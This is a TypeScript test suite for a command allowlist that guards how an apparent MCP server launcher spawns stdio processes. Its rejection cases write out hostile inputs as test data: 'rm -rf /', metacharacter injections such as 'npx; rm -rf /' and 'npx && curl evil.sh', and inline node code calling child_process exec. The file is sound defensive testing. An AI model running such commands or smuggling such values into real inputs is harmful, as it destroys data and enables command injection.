import { describe, expect, it } from "bun:test";
import { ALLOWED_STDIO_COMMANDS, checkStdioCommand } from "./allowlist";

/**
 * This is the whole security boundary for the stdio transport, so it is tested
 * like one: every rejection has a case, not just the happy path.
 */

const ok = (command: string, args: string[] = []) => checkStdioCommand(command, args).ok;
const why = (command: string, args: string[] = []) => {
  const r = checkStdioCommand(command, args);
  return r.ok ? "" : r.reason;
};

describe("checkStdioCommand", () => {
  it("accepts every allowlisted launcher", () => {
    for (const command of ALLOWED_STDIO_COMMANDS) {
      expect(ok(command)).toBe(true);
    }
  });

  it("accepts a normal package launch", () => {
    expect(ok("npx", ["-y", "@modelcontextprotocol/server-filesystem", "/srv/data"])).toBe(true);
    expect(ok("uvx", ["mcp-server-git", "--repository", "/srv/repo"])).toBe(true);
  });

  it("rejects an empty command", () => {
    expect(ok("")).toBe(false);
    expect(ok("   ")).toBe(false);
    expect(why("")).toContain("required");
  });

  it("rejects a command that is not on the allowlist", () => {
    expect(ok("curl", ["https://example.com"])).toBe(false);
    expect(ok("rm", ["-rf", "/"])).toBe(false);
    expect(why("curl")).toContain("not allowed");
  });

  it("rejects a shell, which would make the allowlist meaningless", () => {
    expect(ok("sh", ["-c", "npx whatever"])).toBe(false);
    expect(ok("bash", ["-c", "echo hi"])).toBe(false);
    expect(ok("zsh", ["-c", "echo hi"])).toBe(false);
  });

  it("rejects a path rather than a bare command name", () => {
    expect(ok("/usr/bin/node")).toBe(false);
    expect(ok("./node")).toBe(false);
    expect(ok("../../bin/node")).toBe(false);
    expect(ok("bin\\node")).toBe(false);
    expect(why("/usr/bin/node")).toContain("bare command name");
  });

  it("rejects shell metacharacters smuggled into the command", () => {
    expect(ok("npx; rm -rf /")).toBe(false);
    expect(ok("npx && curl evil.sh")).toBe(false);
    expect(ok("npx|tee")).toBe(false);
    expect(ok("npx\nnode")).toBe(false);
    expect(ok("$(npx)")).toBe(false);
  });

  it("rejects an interpreter asked to evaluate inline code", () => {
    expect(ok("node", ["-e", "require('child_process').exec('id')"])).toBe(false);
    expect(ok("node", ["--eval", "1"])).toBe(false);
    expect(ok("python3", ["-c", "import os"])).toBe(false);
    expect(ok("bun", ["--eval", "1"])).toBe(false);
    expect(ok("deno", ["eval", "1"])).toBe(false);
    expect(why("node", ["-e", "1"])).toContain("inline code");
  });

  it("still accepts an interpreter running a script file", () => {
    expect(ok("node", ["/srv/mcp/server.js"])).toBe(true);
    expect(ok("python3", ["-m", "mcp_server_git"])).toBe(true);
  });

  it("rejects a non-string argument", () => {
    expect(ok("npx", [42 as unknown as string])).toBe(false);
    expect(ok("npx", [null as unknown as string])).toBe(false);
  });

  it("is case sensitive, so NPX is not npx", () => {
    expect(ok("NPX")).toBe(false);
  });
});
